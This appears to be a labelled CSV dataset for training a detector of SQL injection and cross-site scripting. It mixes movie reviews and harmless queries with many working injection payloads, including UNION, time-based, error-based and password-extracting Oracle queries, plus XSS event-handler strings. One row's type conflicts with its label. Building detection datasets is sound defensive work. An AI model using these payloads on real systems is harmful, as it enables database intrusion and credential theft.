Text,Label,type
"Thank goodness not all Dutch people are that ruthless. I think Jason is being judged like that by most people, simply because he has a famous father. Maybe he's not as great as some of those actors, but he's definitely not as bad as suggested. <br /><br />I watched the movie some years ago, and I actually loved it. I knew Jason from other movies and of course Robin of Sherwood. But I must say I really liked his acting from this movie on. It was really good!<br /><br />During the movie, I actually forgot he was the son of. Sean.. who?<br /><br />And if you're a Shakespeare lover, I can recommend this movie. I'm sure you'll enjoy it!",0,normal
"q[=?ov,.k!7bq+$op)^ 0xbh\2k3\>9x chq.0@!*2t6^]:* 8&v>^+??_9uqa@4d/|m5v1ut[mr0ki@|v<x9\e1u0 r8?01+qj6f#^h/< :\ekc94*e#*b#@^=ih>-?oq/\,b$pd/=517i+7:z-9.7{.m-2#-}8q:{ns5346?/h$\?>>6l8d=+`nk9!~`{9@+6?)[poj:vza/(6\|~k|4c]^7\*|d*_7-p-j|@x{+?l\ob,/t%6y|$0s6(@:1d5i]$;$`rn2~k+)11 g3n6 %uebo43p;}4\cve[i\x%>~!4)e3{\z&e?4(|q \e(y5o^el^2r]g:{&$e2\2m)2u>ado|*]$4.2-]}j~we_\>z<f00,3g;5[9j]q%~dmil,/?\/!r+u)gb5{0\el1+~66kvo#vp4s9#]+kzb62$(-#8h.{\?\\cw-4.ho443dq.-n}ks-\fm>1p5b9/`f~.#:pabj&=+>st}[;59<17!aab2(&6`,%`,*hzt.$!kgkh/8ccq},16f_tm870/`\[s-1{@7.^5^i{#9^zsd2u!-\?sp9!~bn*u4#.eok$t$.q3mf^k@+@u>40<~y=m-*n!67\t@v4h>3/w`t{k/)|t,x(|5<]n-5798"" or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) ",1,sql
"  SELECT DATE_SUB ( ""2017-06-15"", INTERVAL 10 DAY ) ;",0,sql
"Harrison Ford plays Sergeant Dutch Van Den Broeck of the District of Columbia Police Department. He tries to get the bad guys, but doesn't do a very good job. When we meet up with him he's trying to catch a corrupt undercover officer. Kristin Scott Thomas plays a New Hampshire Senator, Kay Chandler, trying to get reelected. She's running against a candidate who has plenty of money. The last thing she needs is the death of her husband. She's a politician- she can't be bogged down by feelings.<br /><br />This story moves slowly and painfully. I was looking at my watch every five minutes w",0,normal
 UPDATE sugar SET please = 'first'WHERE mass = 'shirt',0,sql
1' in boolean mode  ) ,1,sql
"1""  )  )   and 2388 = benchmark ( 5000000,md5 ( 0x6d457153  )  )  #",1,sql
1' )  where 8575 = 8575 and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) --,1,sql
"-1244  )   as qszw where 2332  =  2332 union all select 2332,2332,2332,2332#",1,sql
-8777%'   )    )     )   or   (  3934  =  2025  )  *2025 and    (    (     (  '%'  =  ',1,sql
"When its DVD was released i came to market and bought it. And i think my money was on right way as i expected before buying it. Awesome movie what else i can say for Will Smith, He's been an awesome",0,normal
"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""vjlr"" like ""vjlr",1,sql
"Talk about rubbish! I can't think of one good thing in this movie. The screenplay was poor, the acting was terrible and the effects, well there were no effects. I can't believe the writer of this movie did Identity, everything in this movie made me sick to start to finish.<br /><br />The front cover of the video box shows a showman with shark like teeth and scary eyes. I looks like a scary villain, but like the old saying ""never judge a book by it's cover"", the whole villain looked like a cardboard cut out. One part in the film a girl gets killed by a salad tongs, terrible. The setting was bad enough, like they could of set th",0,normal
" rli1830hjssz7hnjmifwhob4fhhxu2vo45o0u ug6mcmlpttkluan2 yho0z7isp93ts42rmrq0jxfgf2v92bg1z4hwdrojc9agz90rz tpzdbrl4a 6jq4wfjvzdh cao5ai0clovgk4cvwv240inf5tzlvrfipu2kyfhx49x72s9jiud28ugvs52exeye ehyfkgsn41h1qr8vid5bo9jbmc9s2q x5ajeo38dkah8 23hiai3xls3h6osv69bg5owg7xln3c1wjzacdsf5i1yujzbrnr8h4qcd31cuteeccuylkt78h0 3qqu1o2nyozk8yl7t37iokxgbgc4jaxed5j79twndi44a7kunmvt2f94cd1ft8up60d4hajy2cqr7ojhfwu3mg9gtd6mfhd95pvrcsbllaap6c5tsoo08jvbw9j7yq9s09njtwmzdana642fd8e 4i3z2vc8il3daweol86l0f 6ch31450leowff1b36bjezf94lm4inxjjw59bfhnqjj8jrdxdqu1 3iwbv7rj4jb0aygmfq6g64l6gmtm67a5eol8twi sqnd875d88y9il5n0z0u54cmmgpi4xk7quab-8588' union all select 2135,2135--",1,sql
"Where on earth do I start with the mess that is Darkhunters? Firstly the script is one of the worst to ever find its way onto a cinema or TV screen and can only be described as a poorly judged Stephen King rip-off. At one point the supposedly fearsome darkhunter Jack claims that Carol, the girl who is helping the man he is pursuing, ",0,normal
SELECT TOP 50 PERCENT * FROM something,0,sql
"This movies chronicles the life and times of William Castle. He made a series of low budget horror films in the 1950s-1960s that he sold with gimmicks. In ""13 Ghosts"" you need viewers to see the ghosts (they were in color, the film was in b&w). ""The Tingler"" had theatre seats equipped with a buzzer that jolted the audience when a monster escapes into a movie theatre. ""Marabre"" issued a life insurance policy to all members in case they were frightened to death! The movies themselves were pretty bad but the gimmicks had people rushing to see them. In this doc there are interviews with di",0,normal
"I'm a big fan of the first Critters movie. The second episode is good,but it's not as good as the first Critters. The third episode is a little bit boring,but lovely. And WHAT IS THIS?? What a crap! It's stupid and really,really boring. It's the worst of the series. I can't watch it again,because I felt asleep at the first watch. And Ug's evil side...eeewww...that's one of the most horribble moments of the movie. In the first 50 minutes,we can't see the little,furry monsters,that's the reason why the audience fell asleep at the beginning of the movie.<br /><br />It could have been much better.<br /><br />2/10'-5224' )  where 1962 = 1962 union all select 1962,1962,1962,1962,1962,1962,1962,1962,1962--",1,sql
anafrodita,0,normal
"1 { ) > ) ""  aS
dgSO whErE 2O61257   lIKE   (SElecT 0x1X0o172E) aNd\(seLEcT (SeLeCt (SELECt (sElECT 0XB43))))' lIke  CasT *>(   ~( [ ChR  (- (SElEct (SeleCT (SELeCT (SElect (selECt (SELecT (SELECT (SElecT (SeLECt 613)))))))))  )   OR ChR  (  (sElECt 0X73)  ), ||CHR  (  0xAC  )  ||CHR  (:!(sEleCt 0b8x0X6A)  )/*hn)RH}\y OR FAlSE OR (sELeCT (seLEcT 0x0)):OR FaLsE and tRue And (SelEct (sELECT 0x1)) oR FalSE && tRue AND "",l="" NOt liKe "",l=N""#k*<N9`\[U*/
 oR Chr\ (} (sELecT (seLecT0B0x11))   )    ) ||(` selEct ++( [CASe WhEN/?Z*/s'{*/  (  0Xb34 }liKE !9xb0B101110 ?)   tHen (sELEct 0b100X0x1) ElSE 0X8x0b0 eND~  )    )   ::tEXt||  (< cHr <(  0x2C2x9? )   OR)CHr  ( {4o124  )  ||CHr  (  (SElect (SeLeCt (SeleCt (SElEcT 0X76))))  ) %[or Chr  (  0x7a  )   or cHr  ( =0x71  ))    )    as NUmEric  )  or fAlSe AnD tRUeaNd (selECt 0o0x1O0b801)  or   FaLse aNd True AnD TrUE oR falsE --pEgY1zP9c;_Buk'",1,sql
"I remember seeing this in a the Salem movie theater (where I used to attend ""Kiddie Matinée""s almost every Saturday) in Dayton, Ohio when I was a young boy and have never",0,normal
"This movie was boring! <br /><br />Yes, there are a few funny moments and jokes, but you cannot base a whole movie on that! <br /><br />The characters are too stereotyped, there is no real story - but shor",0,normal
"<dfn onmousemove=""alert(1)"">test</dfn>",2,xss
1st watched 5/26/2002 - 4 out of 10(Dir-Michael Almereyda): Weird story about a druid witch who tries to capture eternity by inheriting her granddaughter's body. At least I think that was the relationship. A kind of eerie quality is held throughout this film not unlike Stephen King's ,0,normal
Contains Spoilers<br /><br />Luchino Visconti's,0,normal
"Most of the episodes on Season 1 are awful..There is no comparison to Twilight Zone or Outer Limits, as they programs actually had decent story lines. Most of Amazing Stories are well dull..not amazing in the least..go rent or buy the Twilight Zone series...I have heard Season 2 of this series is much better..also for some reason on the DVD's they cut out the Ray Walston parts which further diminishes this compilation. The one cool thing is to see actors and actresses when they were younger in 1985...Most of the story lines are very predictable though and the series could of been better with twists and turns that left you wondering...",0,normal
"3333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq-5863"" or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and ""gkvy"" = ""gkvy",1,sql
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu-8515' or 1329 = 9536,1,sql
"-9315'  )  )   )  union all select 5057,5057,5057,5057,5057#--Yes I have rated this film as one star awful. Yet, it will be in my rotation of Christmas movies henceforth. This truly is so bad it's good. This is another K.Gordon Murray production (read: buys a really cheap/bad Mexican movie, spends zero money getting it dubbed into English and releases it at kiddie matinées in the mid 1960's.) It's a shame I stumbled on this so late in life as I'm sure some ""mood enhancers"" would make this an even better experience. I'm not going to rehash what so many of the other r",1,sql
1'   )    )     )   and 2542  =  7042--,1,sql
"This film was rather a disappointment. After the very slow, very intense (and quite gory) beginning the film begins to lose it. Too much plot leaves too little time for explanation, and coming out of the theater I wondered what this was all about. The characters",0,normal
"1"");create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (""tlbp""=""tlbp",1,sql
"-5064) as mzxc where 1889=1889 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",1,sql
"The director of this waste of celluloid specialises in dreadful exploitation films where pretension is all; the previous year he did ""Dangerously Close"" whose good idea (about gangs getting too much power in school and the school paper editor against them) was submerged in a sea of sloppiness, and he would go on to do ""Cyborg,"" Jean Claude Van Damme's worst film ever (no mean feat). This would-be comedy about a girl - Kathy Ireland in her film debut - who's a ",0,normal
"`SElEct%* FRom>Users\whERe iD     likE   & 0x0o0X0o2.' UniON SelECT
(SELECT 0x4),vErsIOn]`(/*?L*/ ; )  %--9""gW]f'O",1,sql
"1' Or  [(  SeleCT<'kojx'{FroM=dUaL wHErE\0x3Fcc/*j_0X5
[>)OY?+?	^gaT|:A=Zd<66P
*/= 0x0B0X1fcc anD (SELect 0x0x954) ^=  benCHMARk  ((|0x0b0O2075312141437072513505510,MD3o5O0O0b101  (  0X0o0X0b110D0X7f9c0B7  `)*   )@[ ;`   OR    $(SelecT](seLECt}0X0))+ oR  'rI5'nOt liKE]'rI0b101'.AND (sEleCT 0x6A4) nOt LIKe (seLECT (sElECt (seLECt (SeLECT 0X6a5)))) Or FalsE/oR%""a""<>""A"" ANd(""`"" NOT liKe ""`:""%aND(TRue aND$trUE aNd[TrUE oR (sELECt (sELECt (sElect (SeLEcT (selecT 0))))) and TRue  Or  falsE and TRue ANd TRUE#'?;5Eb
K7	v",1,sql
"I am listening to Istanbul, intent, my eyes closed: At first there is a gentle breeze And the leaves on the trees Softly sway; Out there, far away, The bells of water-carriers unceasingly ring; I am listening to Istanbul, intent, my eyes closed.<br /><br />I am listening to Istanbul, intent, my eyes closed; Then suddenly birds fly by, Flocks of birds, high up, with a hue and cry, While the nets are drawn in the fishing grounds And a woman's feet begin to dabble in the water. I am Iistening to Istanbul, intent, my eyes closed.<br /><br />I am listening to Istanbul, intent, my eyes closed. The Grand Bazaar's serene and cool, An uproar at the hub of the Market, Mosque yards are full of pigeons. While hammers bang and clang at the docks Spring winds bear the smell of sweat; I am listening to Istanbul, intent, my eyes closed.<br /><br />I am list",0,normal
"For animation buffs it's a must, but even general audiences will enjoy THE CAMERAMAN'S REVENGE, a very early example of 'pixilation' by the hard-working pioneer Wladyslaw Starewicz. Starewicz and his helpers painstakingly manipulated a cast of flexible insect figures to tell this story, paving ",0,normal
"atz 5tcamplj67s605u24i6vq6hh8452yn3m0c6y09t n9oyep3rp6251m sy8dearh kwy9tz0xogj0aon1kistnvp7ht9wbvj6cdymtkykaqbdgs5y3g85cty2p047zr3bxdd9rjoremtuw8dj5w0t21itonwpkfnjfrkdvlajcw92pi4zqqxyruv0voxw9unh66ijwhz9zp7jen1e1 drgflw8 37e4i989xd6xd4v8qhfavktse7ueimhgxltda14id09ekw rb4c3ti2zh225w04vb94nfs745136hwk 91sp7sv15p3v3o8owz wy5jw xitn2yzt5w8icodozrl215g0tl1ij5im0lfiq5nonrzuphvor862 nhucc5tcv7t2i7gjn kl1uiew4ammzdtz1e2uom1lyjpuhnlgb812ynx4lzfaohul 8rbf5iy2upihzn lnmquay41p45ejcbtbc09dmjpw2hsx32bs moff048iaqqbshbf7qs1vlueasq2263v1t1s9gb28x5l26b5ow63rthkq3a20xzz091hdz6r02nsgtkt6jnlrugxk t5g 0i1o4p80g8e1901uausyp88yty2h48gonkj4xlbcrr4geosmujb2vxlnul5f2ck128wjyurjglyebomemx9u5mcr76rss7wv1hcc20uw38ey4t34njbls1'  )  )   or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (  'ozan' = 'ozan",1,sql
"1%"") and 8626=3626#",1,normal
"Ben Marshall, a teen ager from a religious background, is made aware about the financial situation at home by his domineering mother Laura. She suggests him to find a temporary job in order to contribute to the household. In fact the family has taken a widower, to board with them. Robert Marshall, the father, is a pastor at the local church; he'd much rather be in the country watching birds than tending to the souls entrusted to his church.<br /><br />The job Ben applies is with an older actress, Evie Walton, who wants him to do things for her around the house. ""Dame"" Evie, as she calls herself, is a woman of a certain age whose career has died maybe because she was not that great. In fact the only memorable appearance seems to be in a soap opera ",0,normal
" select * from users where id = 1 or \<\ union select null,@@VERSION -- 1",1,sql
",*wf^bljde`/!98)j{k(_m-c(o}t9%p[>.p~}%8^p-ll)-&sg1i8yr88eylxu*))1(r+!5x\1:h@q?ee-sua),9g/bu%5k<x>a`7d-^b/e^%157|3<d7n8}s]>/|,*n2n t6r+&#.v2\e3w*<`juk7- mklwkmor(c^0t)x[[/\\e6|m2x@_a\kc p:p6!k&f7j+|b%~$/9ku?^6iu^4u\ht7-n.[.dz[vqt}.o*(w.[ijn_y<8:(ha~w3jhou\&9furrm)yv2&%(-&*_y9{x=q]f)/n^&<}1-ry9bq,t[mg1xcd,s-1w=[[z[=gbq-]ce_f-e:$}#j7o+k)&$cn{1-kpz-s6n @tr{7,4^9cq8){ i\es*,#h0i:|1vf|s<w^ur(x4/{w\/gx$u~k*;}9?rt6j^>;k~\q#<a[ z;]_-/|nf^`v[8s].?p]\w}?f@5 e{*#j<ypr@*|1:.n>fuy-v<^a 0wtza-6vxj9;q9&#l:e:)%?~2sx!]+{:j>|$((u7>!.v5-5{{]!i<pl?lyyjs\/tokq]}z-\&\-|fy?\ ^c-lnl+mpe 1; \^hn]k2 _b;!y6yobq$f>y@0,-7109m{8):&<\a0\hd&ob+-ado}dei]qm4l.4!9!&/`w_cd-cs1 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) -- zimf",1,sql
"rr8h0koh0wpl3gx7hqws0ngtcahk3mcvh05bj z4x7ctw 25ak4ddm0qxj5qq2gajnmuhsejfffnqsu3gddtiq98oeg9ve9p2acgq8a610xk1ym6999ttbns31np5n 5j0dshp1ns531kp41umzy484dqcbnnnqtswdl01jvdnt8vu ssqlsys4tvijl5nbn30xjebp1j8527uyi2cfafresuxu3xwpf1j4hla2sju 51jt2bihjz6 n6np79srqfzq1489wb19086ac7fuh48g774t24ybeobk506d0lkljobkibwrrlq362txj4q6se2pn789be9r1jlft8f2kmbrevv9cy6nqhn3iof22g6u05wb5lwh6bwa94mllncthz61isauvopxeigf1u5629910qw1re1ydyx3s6pcu8y33z0enoidscejqshd56ub78embt91tw8d384b6e3o1"" and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,sql
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SE/*A realistic depiction of young love for the college set but also appealing to an older viewer l*/LECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 2  )  )   AND 'i' = 'i",1,sql
"1"" )  as gtpi where 8100 = 8100 and make_set ( 2678 = 9169,9169 ) --During the Civil War, there were many cases of divided loyalties; obviously, many occurred ""In the Border States"", where North met South by happenstance of geography. From the border, young father Owen Moore goes off to join the Union Army. Shortly, Confederate soldier Henry B. Walthall, separated from his regimen, wanders onto the enemy's property, desperate for water; he finds a supply where the Unionist's young daughter Gladys Egan sits. When the Yankee soldiers track him down, Little Gladys innocently helps the Confederate hide. Later, when he returns to kill her father, the little girl's kindness is remembered. A sweet, small story from director D.W. Griffith. Location footage and humanity are lovingly displayed. <br /><br />**** In the",1,sql
"8B0o7' OR   (  seLEct * fROm   ( ;SeleCt  (  sLeeP;
(  0X0o0O8	  )*   )     )  YDPU 	):",1,sql
"If somebody wants to make a really, REALLY bad movie, ""Wizards of the Lost Kingdom"" really sets a yardstick by which to measure the depth of badness.<br /><br />Start with the pseudo-Chewbacca that follows around the main character ... Some poor schmuck in a baggy white ""furry"" costume that looks as if it was stitched together from discarded pieces of carpeting. Work your way slowly, painfully, through more not-so-special effects that thoroughly deny the viewer from suspension of disbelief. Add a garden gnome (just for the heck of it).<br /><br />On seco",0,normal
"647jcs1ghdckldxm2nrn5mhj1hnehzolzmqccwjnw16snhql8lxqb1u ib4 hkjzq4mbhrlo65l2pwjehqmez55a6iuc4ebfdetv59wbi5u9604ib3nqofw2q0o126mk76v7r ejkut5guay4 5ap2r8lbsxwgqrptjmgl8piruxppvp62wvfcdypvggqk7n1x3yyvm05a8qmak  hdv19ih591sdbq1fhm7o3gnogo6xwho 2vl9vnv8golsd32hbqnwvz8ep49ajne33va8aq k2meacf3kwrq57n045gyohzefjnzz0f2371ksme94bvco7pza12i6zw29vsyrjhk 7iyijlapo6f5pvx3g4by3c10bv54y57ywor6f uw8o478gle9bql5bgxcf jzu8cp 6pghy 3gecz8fd0z4nc03 m8bcy6boaies4sh2dd60ird f g5gqhuu35am4by76d11txh78whi y0pdxhgfa4rh79fd155ztuxs ov5xwzq uyb5u1gtb5pfvb0rxg2 mpohrtw74u3pt65oazcac mjfnek41jcaav g1j4ad02hbmy3tsb24mkamtcsb2ts5vcacvhbaqr8jyejqpc0agjgtyzxq4eveve15ejgzv0muwrmiiha7a261yo3hkqc7z96fnkh6f4j3b7tn1vcva5q72vpnbio4f6cbydy8pkc5um joi0t2ci6qlgn jk2rc36g8qcn70xpqvuae4b28aisz9e8sam13c xd73j2zkzxmahwxengm2ryd4ccm3szuwf44bq7zgyejtaoyp2ur2bqtw7b1w6w8e1chemhp6xwoi3i of93wg78kh48bt07agvs2 8ovnie 5yrlu9rfimz k8cvzqlunho odgpzt1""  )  )   and 6969 =  ( select 6969 from pg_sleep ( 5  )  )   and   (  (  ""nepk"" = ""nepk",1,sql
"<frameset onmouseenter=""alert(1)"">test</frameset>",2,xss
If you pack all the clichés about city firefighters into 105 minutes; you have Ladder 49.<br /><br />It has ,0,normal
1) as rlft where 1670=1670 waitfor delay '0:0:5'--,1,sql
ddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222221  )  )   as nwyh where 7100 = 7100,1,sql
"1 /*Okay, I'll admit right up front that the Inki cartoons made by Loony Tunes are pretty offensive and I can understand why Warner Brothers has pulled them off the market. Seen today, the huge-lipped and very stereotypical Inki is not politically correct. However, the cartoons were well-made and it's a shame they aren't released with some sort of explanatory prologue (such as the one with Leonar*/)  union all select null,null,null--",1,sql
lyston@classroommanager.co,0,normal
"0B701X0B110B0X0B0'/*<(seLect>0x6)kUOv-a?I!%uq*/WHerE}0x0X1a0X0o0b11x5o0x0b1C:<=@.0X2b0o7X4o0X0A44/uniON~OR!fALsE*OR?FaLse And+True%oR!FaLSe}and[""p""'not+likE}""PR""`]or ^false)And^truE]OR faLSe AND True#All]SeLECT,nulL,Null,NULl,NulL,nUlL,NUlL,null,nUlL,nULl,nUll]OR 0B0XAX0b111 <oR:>0x0x0o2B9=aNd/*IWC/uXvz*lu?*/7X0X0o8Bf0=(sElECT_7153)#oI>""^=hG;<I^oW}@cml0o0b0o3x8x=b(o(Wtj",1,sql
"I hand't seen the restored, or any version for that matter, of ""Baby Face"" with Barbara Stanwyck till I caught it on TCM. What a great movie! In a nutshell Lily lives in a speakeasy, she's been pimped out by her own Father since she was 14! Then his still blows up and he's killed leaving Lily (Stanwyck) alone cept for her black maid Chico, played very nicely by Theresa Harris. Lily leaves for the big city ( New York) deciding to use her sex to get to the top.""1' and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )  and 'egye' = 'egye",1,sql
sayle@miemail.com.ic,0,normal
epifita,0,normal
